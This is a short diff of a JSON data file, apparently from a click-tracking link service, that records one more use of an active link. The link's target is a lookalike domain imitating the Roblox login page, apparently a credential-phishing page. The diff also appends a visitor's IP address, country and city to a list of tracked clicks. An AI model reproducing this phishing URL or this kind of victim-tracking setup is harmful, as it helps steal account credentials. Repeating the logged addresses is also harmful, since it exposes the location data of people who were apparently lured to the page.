@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 392,
+    "useCount": 393,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3248,6 +3248,14 @@
         "city": "Root",
         "flag": "🇨🇭",
         "countryCode": "CH"
+      },
+      {
+        "timestamp": 1777043426617,
+        "ip": "86.124.184.141",
+        "country": "Romania",
+        "city": "Piteşti",
+        "flag": "🇷🇴",
+        "countryCode": "RO"
       }
     ]
   },
